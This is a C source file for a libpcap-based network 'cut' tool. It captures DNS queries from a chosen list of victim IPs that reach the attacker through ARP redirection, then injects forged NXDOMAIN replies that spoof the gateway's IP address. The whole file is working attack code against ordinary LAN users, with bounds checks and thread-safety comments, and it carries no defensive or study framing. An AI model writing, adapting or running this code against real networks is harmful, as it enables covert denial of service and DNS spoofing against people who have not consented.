#include "wm_cut.h"

#include <pcap.h>
#include <pthread.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>

/* Wire-format helpers (packed). */
#pragma pack(push, 1)
typedef struct { uint8_t dst[6], src[6]; uint16_t etype; } eth_hdr_t;
typedef struct {
    uint8_t  ver_ihl;       /* 0x45 */
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag;
    uint8_t  ttl;
    uint8_t  proto;         /* 17 = UDP */
    uint16_t csum;
    uint32_t src;           /* network byte order */
    uint32_t dst;           /* network byte order */
} ip_hdr_t;
typedef struct {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t csum;
} udp_hdr_t;
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_hdr_t;
#pragma pack(pop)

#define ETH_TYPE_IP   0x0800
#define IPPROTO_UDP_  17

#define MAX_VICTIMS   64
#define ETH_MIN_LEN   60
#define WM_DNS_RCODE_NXDOMAIN 0x8183  /* QR=1, RD=1, RA=1, RCODE=3 */

typedef struct wm_cut_ctx {
    pcap_t  *pcap;
    uint8_t  our_mac[6];
    uint32_t our_ip;        /* network byte order */
    pthread_mutex_t lock;
    uint32_t victims[MAX_VICTIMS];
    int      n_victims;
    uint64_t dns_responses;
    uint64_t dns_seen;
    uint64_t inject_failures;
} wm_cut_ctx_t;

/* IPv4 1's-complement checksum. */
static uint16_t cksum16(const void *buf, size_t len) {
    const uint16_t *w = (const uint16_t *)buf;
    uint32_t sum = 0;
    while (len > 1) { sum += *w++; len -= 2; }
    if (len) sum += *(const uint8_t *)w;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

/* UDP checksum over IPv4 pseudo-header. */
static uint16_t udp_cksum(uint32_t src, uint32_t dst,
                          const udp_hdr_t *udp, const uint8_t *payload,
                          uint16_t udp_len) {
    /* Pseudo-header. */
    uint8_t buf[2048];
    if (udp_len + 12 > sizeof(buf)) return 0;
    int off = 0;
    memcpy(buf + off, &src, 4); off += 4;
    memcpy(buf + off, &dst, 4); off += 4;
    buf[off++] = 0;
    buf[off++] = IPPROTO_UDP_;
    uint16_t udp_len_n = htons(udp_len);
    memcpy(buf + off, &udp_len_n, 2); off += 2;
    /* UDP header with csum=0. */
    udp_hdr_t hdr = *udp;
    hdr.csum = 0;
    memcpy(buf + off, &hdr, sizeof(hdr)); off += sizeof(hdr);
    /* Payload. */
    int payload_len = udp_len - sizeof(udp_hdr_t);
    if (payload_len > 0) memcpy(buf + off, payload, payload_len);
    off += payload_len;
    if (off & 1) buf[off++] = 0;  /* pad to even */
    return cksum16(buf, off);
}

void *wm_cut_open(const char *iface,
                  const uint8_t our_mac[6],
                  const char   *our_ipv4,
                  char         *errbuf) {
    char eb[PCAP_ERRBUF_SIZE];
    pcap_t *p = pcap_create(iface, eb);
    if (!p) { snprintf(errbuf, 256, "pcap_create: %s", eb); return NULL; }
    pcap_set_snaplen(p, 1500);
    pcap_set_promisc(p, 0);
    pcap_set_timeout(p, 50);
    pcap_set_immediate_mode(p, 1);
    int rc = pcap_activate(p);
    if (rc < 0) {
        snprintf(errbuf, 256, "pcap_activate: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }

    /* BPF filter: only DNS queries that hit our MAC at L2 because ARP-redirect
     * delivered them. We intentionally do NOT match dst-IP — the whole point is
     * that the dst IP is the gateway's, not ours. */
    char filter[160];
    snprintf(filter, sizeof(filter),
             "ether dst %02x:%02x:%02x:%02x:%02x:%02x and udp port 53",
             our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5]);
    struct bpf_program prog;
    if (pcap_compile(p, &prog, filter, 1, PCAP_NETMASK_UNKNOWN) < 0) {
        snprintf(errbuf, 256, "pcap_compile: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }
    if (pcap_setfilter(p, &prog) < 0) {
        snprintf(errbuf, 256, "pcap_setfilter: %s", pcap_geterr(p));
        pcap_freecode(&prog);
        pcap_close(p);
        return NULL;
    }
    pcap_freecode(&prog);

    wm_cut_ctx_t *c = calloc(1, sizeof(*c));
    if (!c) {
        snprintf(errbuf, 256, "calloc");
        pcap_close(p);
        return NULL;
    }
    c->pcap = p;
    memcpy(c->our_mac, our_mac, 6);
    if (inet_pton(AF_INET, our_ipv4, &c->our_ip) != 1) {
        snprintf(errbuf, 256, "bad our_ipv4: %s", our_ipv4);
        pcap_close(p);
        free(c);
        return NULL;
    }
    pthread_mutex_init(&c->lock, NULL);
    return c;
}

void wm_cut_set_victims(void *handle,
                        const char **victim_ipv4_strs,
                        int n_victims) {
    if (!handle) return;
    wm_cut_ctx_t *c = (wm_cut_ctx_t *)handle;
    pthread_mutex_lock(&c->lock);
    int n = 0;
    for (int i = 0; i < n_victims && n < MAX_VICTIMS; i++) {
        uint32_t ip;
        if (inet_pton(AF_INET, victim_ipv4_strs[i], &ip) == 1) {
            c->victims[n++] = ip;
        }
    }
    c->n_victims = n;
    pthread_mutex_unlock(&c->lock);
}

static int is_victim(const wm_cut_ctx_t *c, uint32_t ip_n) {
    for (int i = 0; i < c->n_victims; i++) {
        if (c->victims[i] == ip_n) return 1;
    }
    return 0;
}

int wm_cut_pump(void *handle, int max_packets) {
    if (!handle) return 0;
    wm_cut_ctx_t *c = (wm_cut_ctx_t *)handle;
    /* Hold the lock for the entire pump call — pcap_next_ex AND pcap_inject
     * both need to run on a still-valid `pcap` handle. close() also acquires
     * this lock and calls pcap_close *inside* it, so the two cannot interleave.
     * Worst-case latency this imposes on close/set_victims: ~50 ms (pcap
     * timeout) — acceptable for iface-change rarity. */
    pthread_mutex_lock(&c->lock);
    pcap_t *pcap = c->pcap;
    if (!pcap) { pthread_mutex_unlock(&c->lock); return 0; }

    int responded = 0;
    for (int i = 0; i < max_packets; i++) {
        struct pcap_pkthdr *hdr;
        const u_char *pkt;
        int rc = pcap_next_ex(pcap, &hdr, &pkt);
        if (rc <= 0) break;  /* timeout/error → stop draining */
        if (hdr->caplen < sizeof(eth_hdr_t) + sizeof(ip_hdr_t) + sizeof(udp_hdr_t) + sizeof(dns_hdr_t)) continue;

        const eth_hdr_t *eth = (const eth_hdr_t *)pkt;
        if (ntohs(eth->etype) != ETH_TYPE_IP) continue;

        const ip_hdr_t *ip = (const ip_hdr_t *)(pkt + sizeof(eth_hdr_t));
        if ((ip->ver_ihl >> 4) != 4) continue;
        int ip_hdr_len = (ip->ver_ihl & 0x0f) * 4;
        /* IP header length can be 20–60 bytes; the initial caplen check
         * assumed exactly 20 (sizeof(ip_hdr_t)). Re-validate now that we
         * know the real header length, so a packet with IP options doesn't
         * let us read UDP/DNS bytes past the actual capture. */
        if (ip_hdr_len < (int)sizeof(ip_hdr_t)) continue;
        if ((int)hdr->caplen
            < (int)sizeof(eth_hdr_t) + ip_hdr_len
              + (int)sizeof(udp_hdr_t) + (int)sizeof(dns_hdr_t)) continue;
        if (ip->proto != IPPROTO_UDP_) continue;

        const udp_hdr_t *udp = (const udp_hdr_t *)(pkt + sizeof(eth_hdr_t) + ip_hdr_len);
        if (ntohs(udp->dst_port) != 53) continue;

        /* Validate udp->length BEFORE subtracting — if the field is less
         * than the UDP header itself (malformed packet, deliberate fuzz),
         * an unsigned subtraction would wrap to a giant number and
         * subsequent memcpy would over-read. */
        uint16_t udp_length = ntohs(udp->length);
        if (udp_length < sizeof(udp_hdr_t) + sizeof(dns_hdr_t)) continue;
        /* And the claimed UDP length must fit in what we actually captured. */
        if ((int)hdr->caplen
            < (int)sizeof(eth_hdr_t) + ip_hdr_len + (int)udp_length) continue;

        c->dns_seen++;

        /* Victim check — we already hold the outer lock for the entire pump
         * call, so re-locking here would deadlock the default (non-recursive)
         * mutex. The victim list is owned by this lock; reading it is safe. */
        if (!is_victim(c, ip->src)) continue;

        /* Build NXDOMAIN response: same id+question, flags = NXDOMAIN, ancount=0. */
        const uint8_t *q_payload = (const uint8_t *)udp + sizeof(udp_hdr_t);
        int q_payload_len = (int)(udp_length - sizeof(udp_hdr_t));
        if (q_payload_len > 1400) continue;  /* sanity: don't echo crazy queries */

        const dns_hdr_t *q_dns = (const dns_hdr_t *)q_payload;

        /* Reply payload = same length as query, but flags + zeroed ancount/nscount/arcount. */
        uint8_t reply[1500];
        if (q_payload_len > (int)sizeof(reply)) continue;
        memcpy(reply, q_payload, q_payload_len);
        dns_hdr_t *r_dns = (dns_hdr_t *)reply;
        r_dns->id      = q_dns->id;            /* preserve */
        r_dns->flags   = htons(WM_DNS_RCODE_NXDOMAIN);
        r_dns->qdcount = q_dns->qdcount;
        r_dns->ancount = 0;
        r_dns->nscount = 0;
        r_dns->arcount = 0;
        int dns_len = q_payload_len;

        /* Build full Eth + IP + UDP + DNS response. */
        uint8_t frame[1600];
        memset(frame, 0, sizeof(frame));
        eth_hdr_t *r_eth = (eth_hdr_t *)frame;
        memcpy(r_eth->dst, eth->src, 6);
        memcpy(r_eth->src, c->our_mac, 6);
        r_eth->etype = htons(ETH_TYPE_IP);

        ip_hdr_t *r_ip = (ip_hdr_t *)(frame + sizeof(eth_hdr_t));
        r_ip->ver_ihl   = 0x45;
        r_ip->tos       = 0;
        r_ip->id        = htons((uint16_t)(c->dns_responses & 0xffff));
        r_ip->frag      = htons(0x4000);  /* DF set */
        r_ip->ttl       = 64;
        r_ip->proto     = IPPROTO_UDP_;
        r_ip->src       = ip->dst;        /* spoof: we are the gateway/resolver */
        r_ip->dst       = ip->src;
        uint16_t udp_len = (uint16_t)(sizeof(udp_hdr_t) + dns_len);
        r_ip->total_len = htons((uint16_t)(sizeof(ip_hdr_t) + udp_len));
        r_ip->csum      = 0;
        r_ip->csum      = cksum16(r_ip, sizeof(ip_hdr_t));

        udp_hdr_t *r_udp = (udp_hdr_t *)(frame + sizeof(eth_hdr_t) + sizeof(ip_hdr_t));
        r_udp->src_port = udp->dst_port;
        r_udp->dst_port = udp->src_port;
        r_udp->length   = htons(udp_len);
        r_udp->csum     = 0;

        memcpy(frame + sizeof(eth_hdr_t) + sizeof(ip_hdr_t) + sizeof(udp_hdr_t),
               reply, dns_len);

        r_udp->csum = udp_cksum(r_ip->src, r_ip->dst,
                                r_udp,
                                frame + sizeof(eth_hdr_t) + sizeof(ip_hdr_t) + sizeof(udp_hdr_t),
                                udp_len);

        int frame_len = (int)(sizeof(eth_hdr_t) + sizeof(ip_hdr_t) + udp_len);
        if (frame_len < ETH_MIN_LEN) frame_len = ETH_MIN_LEN;

        if (pcap_inject(pcap, frame, frame_len) > 0) {
            c->dns_responses++;
            responded++;
        } else {
            c->inject_failures++;
            fprintf(stderr, "wm_cut[dns]: pcap_inject failed: %s\n",
                    pcap_geterr(pcap));
            fflush(stderr);
        }
    }
    pthread_mutex_unlock(&c->lock);
    return responded;
}

void wm_cut_stats(void *handle,
                  uint64_t *out_dns_responses,
                  uint64_t *out_dns_seen,
                  uint64_t *out_inject_failures) {
    if (!handle) return;
    wm_cut_ctx_t *c = (wm_cut_ctx_t *)handle;
    if (out_dns_responses)   *out_dns_responses   = c->dns_responses;
    if (out_dns_seen)        *out_dns_seen        = c->dns_seen;
    if (out_inject_failures) *out_inject_failures = c->inject_failures;
}

void wm_cut_close(void *handle) {
    if (!handle) return;
    wm_cut_ctx_t *c = (wm_cut_ctx_t *)handle;
    /* INTENTIONAL LEAK on close — matches wm_traffic_close.
     *
     * The CutLayers Swift actor spawns a `Task.detached` that calls
     * `wm_cut_pump` outside actor isolation. When stop() runs, it cancels
     * the task (a flag set, NOT a sync stop) and immediately calls
     * `wm_cut_close`. If the pump task is mid-`pcap_next_ex`, it's still
     * holding `c` as a captured pointer. Freeing `c` here would UAF on
     * the next pump iteration (specifically inside `pthread_mutex_lock`,
     * which dereferences a freed mutex).
     *
     * Solution: zero `c->pcap` under the lock so subsequent pump calls
     * see NULL and bail; close the pcap handle; leave the ctx itself
     * permanently allocated. Each iface change leaks ~50 KB which is
     * negligible for a long-lived daemon. */
    pthread_mutex_lock(&c->lock);
    pcap_t *p = c->pcap;
    c->pcap = NULL;
    /* pcap_close stays *inside* the lock so concurrent pump (which also
     * locks around pcap_next_ex) cannot be using the handle when we
     * destroy it. Without this, a pump in flight when stop() runs would
     * dereference a freed pcap_t. */
    if (p) pcap_close(p);
    pthread_mutex_unlock(&c->lock);
    /* Deliberately NOT freeing c, NOT destroying c->lock. */
}
